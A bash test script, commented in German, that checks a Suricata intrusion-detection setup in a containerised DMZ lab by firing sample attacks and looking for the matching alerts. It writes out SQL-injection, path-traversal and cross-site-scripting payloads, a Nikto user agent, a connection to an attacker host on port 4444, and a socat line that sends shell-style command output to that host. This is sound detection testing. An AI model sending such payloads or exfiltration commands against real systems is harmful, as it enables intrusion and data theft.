#!/usr/bin/env bash
# Test des IDS (Phase 3, Schritt 3.6).
# Anforderungen: SYS-03, SEC-03, MON-01, V-11
# Aufruf: bash tests/test-ids.sh   (im Repo-Verzeichnis DMZ, nach make deploy)
#
# Methode: Testanfragen mit den Mustern aus configs/ids/local.rules aus dem Internet,
# dem Client-Netz und der DMZ. Jede Anfrage traegt eine Markierung (m=...), ueber die
# der Test den zugehoerigen Eintrag in eve.json wiederfindet.
set -uo pipefail

P="clab-dmz"
. "$(dirname "$0")/lib-response.sh"
response_suspend
EVE=/var/log/suricata/eve.json
M="t$$"
fail=0

x() { docker exec "${P}-$1" "${@:2}"; }

# Werkzeuge aus client:0.1 im Netz eines Knotens, der sie nicht enthaelt
side() { docker run --rm --network "container:${P}-$1" client:0.1 "${@:2}"; }

result() { # Test-ID, Beschreibung, erwartet, Ergebnis
  if [ "$3" = "$4" ]; then
    echo "OK     $1 $2"
  else
    echo "FAIL   $1 $2 (expected: $3, got: $4)"
    fail=1
  fi
}

has() { # Text, Muster (erweiterter regulaerer Ausdruck) -> yes|no
  if printf '%s' "$1" | grep -qE -- "$2"; then echo yes; else echo no; fi
}

events() { # event_type, Muster ... -> Anzahl passender Eintraege in eve.json
  local out
  out=$(x ids cat "$EVE" 2>/dev/null | grep -F "\"event_type\":\"$1\"")
  shift
  for m in "$@"; do out=$(printf '%s\n' "$out" | grep -F -- "$m"); done
  printf '%s\n' "$out" | grep -c .
}

waitfor() { # Mindestanzahl, event_type, Muster ... -> yes|no, wartet bis 5 s
  local n="$1"; shift
  for _ in $(seq 10); do
    [ "$(events "$@")" -ge "$n" ] && { echo yes; return; }
    sleep 0.5
  done
  echo no
}

rx() { x ids sh -c "sed -n 's/^ *eth2: *//p' /proc/net/dev | awk '{print \$2}'" 2>/dev/null; } # empfangene Pakete auf eth2

echo "== Test service on attacker (TCP 4444)"
x attacker pkill socat >/dev/null 2>&1
docker exec -d "${P}-attacker" socat TCP-LISTEN:4444,fork,reuseaddr "SYSTEM:echo ok"
sleep 1

echo "== Service"
# Nach einem Neustart laedt Suricata die Regeln einige Sekunden lang: bis 30 s auf den Start warten
for _ in $(seq 30); do
  x ids grep -q 'Engine started' /var/log/suricata/suricata.log 2>/dev/null && break
  sleep 1
done
if x ids pgrep -f 'suricata --include' >/dev/null 2>&1; then r=ok; else r=fail; fi
result I-00 "Suricata running" ok "$r"
result I-00 "version 8.0" yes "$(has "$(x ids suricata -V 2>&1)" 'version 8\.0\.')"
log=$(x ids cat /var/log/suricata/suricata.log 2>/dev/null)
result I-00 "7 own rules loaded, none failed" yes "$(has "$log" ' 7 rules successfully loaded, 0 rules failed')"
result I-00 "engine started" yes "$(has "$log" 'Engine started')"
if x ids test -e /var/lib/suricata/rules/suricata.rules; then r=yes; else r=no; fi
result I-00 "no third-party rule set in image (E-08)" no "$r"

echo "== Mirror port"
result I-01 "ids eth2 without address (V-11)" "" "$(x ids ip -o addr show dev eth2 2>/dev/null)"
result I-01 "fw-dmz eth6 without address (V-11)" "" "$(x fw-dmz ip -o addr show dev eth6 2>/dev/null)"
for i in eth1 eth2 eth3 eth4; do
  result I-02 "fw-dmz $i: copy to eth6" yes "$(has "$(x fw-dmz tc filter show dev "$i" ingress 2>/dev/null)" 'Egress Mirror to device eth6')"
done
result I-02 "fw-dmz eth5 (ids itself) not mirrored" no "$(has "$(x fw-dmz tc filter show dev eth5 ingress 2>/dev/null)" 'mirred')"
rx0=$(rx)

echo "== Detection"
x attacker curl -sk -o /dev/null "https://203.0.113.2/suche?q=1%27%20UNION%20SELECT%20name%20FROM%20users--&m=$M-3"
result I-03 "Internet: SQL injection detected (SID 1000001)" yes "$(waitfor 1 alert '"signature_id":1000001,' "m=$M-3")"
result I-03 "alert names attacker 192.0.2.10 (xff)" yes "$(waitfor 1 alert '"signature_id":1000001,' "m=$M-3" '"xff":"192.0.2.10"')"

x client1 curl -sk -o /dev/null "https://10.10.10.2/datei?name=../../etc/passwd&m=$M-4"
result I-04 "client network: path traversal detected (SID 1000002)" yes "$(waitfor 1 alert '"signature_id":1000002,' "m=$M-4")"
result I-04 "alert names client 10.10.20.10 (xff)" yes "$(waitfor 1 alert '"signature_id":1000002,' "m=$M-4" '"xff":"10.10.20.10"')"

n0=$(events alert '"signature_id":1000003,' '"src_ip":"10.10.10.10"' '"dest_port":4444')
if side web socat -T1 /dev/null TCP:192.0.2.10:4444,connect-timeout=2 >/dev/null 2>&1; then r=ok; else r=fail; fi
result I-05 "web -> 192.0.2.10 TCP 4444 blocked by fw-dmz (V-12)" fail "$r"
result I-05 "blocked attempt still detected (SID 1000003)" yes "$(waitfor $((n0 + 1)) alert '"signature_id":1000003,' '"src_ip":"10.10.10.10"' '"dest_port":4444')"

x attacker curl -sk -o /dev/null --data-urlencode "username=admin' OR '1'='1" --data-urlencode "password=x" "https://203.0.113.2/login?m=$M-7"
result I-07 "SQL injection in the login form detected (SID 1000004)" yes "$(waitfor 1 alert '"signature_id":1000004,' "m=$M-7" '"xff":"192.0.2.10"')"

x attacker curl -sk -o /dev/null -G --data-urlencode "q=<script>alert(1)</script>" "https://203.0.113.2/search?m=$M-8"
result I-08 "cross-site scripting detected (SID 1000005)" yes "$(waitfor 1 alert '"signature_id":1000005,' "m=$M-8" '"xff":"192.0.2.10"')"

x attacker curl -sk -o /dev/null -A "Nikto/2.5.0" "https://203.0.113.2/?m=$M-9"
result I-09 "scanner user agent detected (SID 1000006)" yes "$(waitfor 1 alert '"signature_id":1000006,' "m=$M-9" '"xff":"192.0.2.10"')"

docker exec -d "${P}-attacker" socat TCP-LISTEN:443,reuseaddr "SYSTEM:sleep 2"
sleep 0.5
n0=$(events alert '"signature_id":1000007,' '"src_ip":"10.10.10.10"' '"dest_ip":"192.0.2.10"')
side web sh -c 'echo "uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)" | socat -T2 - TCP:192.0.2.10:443,connect-timeout=2' >/dev/null 2>&1
result I-10 "command output leaving the DMZ detected (SID 1000007)" yes "$(waitfor $((n0 + 1)) alert '"signature_id":1000007,' '"src_ip":"10.10.10.10"' '"dest_ip":"192.0.2.10"')"

x attacker curl -sk -o /dev/null "https://203.0.113.2/suche?q=hallo&m=$M-6"
result I-06 "normal request is seen (http event)" yes "$(waitfor 1 http "m=$M-6")"
result I-06 "normal request raises no alert" 0 "$(events alert "m=$M-6")"

rx1=$(rx)
[ "${rx1:-0}" -gt "${rx0:-0}" ] && r=yes || r=no
result I-02 "ids eth2 receives copies (${rx0:-?} -> ${rx1:-?} packets)" yes "$r"

echo "== Resources"
echo "   ids: $(docker stats --no-stream --format '{{.MemUsage}}' "${P}-ids")"

x attacker pkill socat >/dev/null 2>&1

if [ "$fail" -eq 0 ]; then
  echo "RESULT: passed"
else
  echo "RESULT: failed"
  exit 1
fi
